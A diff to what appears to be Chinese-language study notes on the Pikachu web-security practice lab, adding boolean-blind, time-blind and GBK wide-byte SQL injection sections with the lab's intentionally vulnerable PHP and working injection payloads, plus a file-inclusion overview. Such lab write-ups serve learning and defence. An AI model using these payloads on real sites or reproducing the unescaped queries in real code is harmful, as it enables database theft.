@@ -23,8 +23,7 @@
 - [第八周作业 1.XSS盲打 2.XSS绕过 3.XSS绕过之htmlspecialchars()函数 4.XSS防范措施href和js输出](https://blog.csdn.net/weixin_43899561/article/details/89647834)
 - [第八周作业 1.CSRF漏洞概述及原理 2.通过CSRF进行地址修改 3.token是如何防止CSRF漏洞？4.远程命令、代码执行漏洞原理及演示](https://blog.csdn.net/weixin_43899561/article/details/89742243)
 - [insert、update和delete 注入方法](https://blog.csdn.net/qq1124794084/article/details/84590929)
-
-
+- [SQL注入：宽字节注入（GBK双字节绕过）](https://lyiang.wordpress.com/2015/06/09/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88gbk%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%EF%BC%89/)
 
 
 
@@ -1051,36 +1050,131 @@ if(isset($_GET['logout']) && $_GET['logout'] == 1){
 后面略
 
 ### 盲注(base on boolian)
+盲注就是在 sql 注入过程中，sql 语句执行的选择后，报错的数据不能回显到前端页面（后台使用了错误消息屏蔽方法屏蔽了报错）。在无法通过返回的信息进行 sql 注入时，采用一些方法来判断表名长度、列名长度等数据后来爆破出数据库数据的的这个过程称为盲注。
+
 **服务器端核心代码**
 ```php
+if(isset($_GET['submit']) && $_GET['name']!=null){
+    $name=$_GET['name'];//这里没有做任何处理，直接拼到select里面去了
+    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合
+    //mysqi_query不打印错误描述,即使存在注入,也不好判断
+    $result=mysqli_query($link, $query);//
+//     $result=execute($link, $query);
+    if($result && mysqli_num_rows($result)==1){
+        while($data=mysqli_fetch_assoc($result)){
+            $id=$data['id'];
+            $email=$data['email'];
+            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
+        }
+    }else{
 
+        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
+    }
+}
 ```
 
 **漏洞利用**
 
+基于 boolean 盲注主要表现：
+```
+1. 没有报错信息
+2. 不管是正确的输入,还是错误的输入,都只显示两种情况(我们可以认为是0或者1)
+3. 在正确的输入下,输入 and 1=1/and 1=2 发现可以判断
+```
+手工盲注的步骤
+```
+1.判断是否存在注入，注入是字符型还是数字型
+2.猜解当前数据库名
+3.猜解数据库中的表名
+4.猜解表中的字段名
+5.猜解数据
+```
+
+`注: 这里 123 是我创建的用户，可能原来是 admin，自己查一下数据库里的数据`
+
+payload: `123' and 1=1 #` 有结果返回说明是字符型
+
+payload: `123' and length(database())=7 #` 有结果，库名字7个字符
+
+后面就是正常的盲注爆库步骤了，略
 
 ### 盲注(base on time)
 **服务器端核心代码**
 ```php
+if(isset($_GET['submit']) && $_GET['name']!=null){
+    $name=$_GET['name'];//这里没有做任何处理，直接拼到select里面去了
+    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合
+    $result=mysqli_query($link, $query);//mysqi_query不打印错误描述
+//     $result=execute($link, $query);
+//    $html.="<p class='notice'>i don't care who you are!</p>";
+    if($result && mysqli_num_rows($result)==1){
+        while($data=mysqli_fetch_assoc($result)){
+            $id=$data['id'];
+            $email=$data['email'];
+            //这里不管输入啥,返回的都是一样的信息,所以更加不好判断
+            $html.="<p class='notice'>i don't care who you are!</p>";
+        }
+    }else{
 
+        $html.="<p class='notice'>i don't care who you are!</p>";
+    }
+}
 ```
 
 **漏洞利用**
 
+源码里注释说的很清楚了，不管输入的是啥，返回的都是一样的。但就算没有不同的返回值，也是存在不同的返回情况的，因为查询语句是一定会被执行的。能通过控制返回的时间来判断查询是否存在
+
+`123' and if(length(database())=7,sleep(5),1) #` 明显延迟，说明数据库名的长度为5个字符；
+
+后面的步骤按部就班，略
 
 ### 宽字节注入
 **服务器端核心代码**
 ```php
+if(isset($_POST['submit']) && $_POST['name']!=null){
 
+    $name = escape($link,$_POST['name']);
+    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合
+    //设置mysql客户端来源编码是gbk,这个设置导致出现宽字节注入问题
+    $set = "set character_set_client=gbk";
+    execute($link,$set);
+
+    //mysqi_query不打印错误描述
+    $result=mysqli_query($link, $query);
+    if(mysqli_num_rows($result) >= 1){
+        while ($data=mysqli_fetch_assoc($result)){
+            $id=$data['id'];
+            $email=$data['email'];
+            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
+        }
+    }else{
+        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
+    }
+}
 ```
 
 **漏洞利用**
 
+id 的参数传入代码层，就会在 `’` 前加一个 `\`，由于采用的 URL 编码，所以产生的效果是
+`%df%5c%27`
 
+关键就在这，`%df` 会吃掉 `%5c`，形成一个新的字节,举个例子就是 `%d5` 遇到 `%5c` 会把 `%5c` 吃掉，形成 `%d5%5c` ，这个编码经过代码解码后会形成一个汉字 `"誠"`
 
+因为 `%df` 的关系，`\` 的编码 `%5c` 被吃掉了，也就失去了转义的效果，直接被带入到 mysql 中，然 后mysql 在解读时无视了 `%a0%5c` 形成的新字节，那么单引号便重新发挥了效果
 
+![image](../../../img/渗透/实验/pikachu/57.png) 这作者写提示就 TM 玩似的，太不友好了
 
+- 测试payload: `lili%df' or 1=1 #`
+- 测试payload: `lili%df%27%20or%201=1%23`
 
+- 爆库payload: `lili%df' union select user(),database() #`
+
+- 爆表payload: `lili%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`
+
+![image](../../../img/渗透/实验/pikachu/58.png)
+
+- 后面略
 
 ---
 
@@ -1142,6 +1236,16 @@ if(isset($_POST['submit']) && $_POST['txt'] != null){
 
 ---
 
+## File Inclusion
+文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：
+- include(),include_once()
+- require(),require_once()
+
+大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：
+1. 本地文件包含漏洞：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。
+2. 远程文件包含漏洞：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。
+
+因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。
 
 
 
@@ -1150,16 +1254,41 @@ if(isset($_POST['submit']) && $_POST['txt'] != null){
 
 
 
+---
 
+## Unsafe Filedownload
 
+---
 
+## Unsafe Fileupload
 
+---
 
+## Over Permission
 
+---
 
+## ../../目录遍历
 
+---
 
+## 敏感信息泄露
 
+---
+
+## PHP反序列化
+
+---
+
+## XXE
+
+---
+
+## URL重定向
+
+---
+
+## SSRF
 
 
 
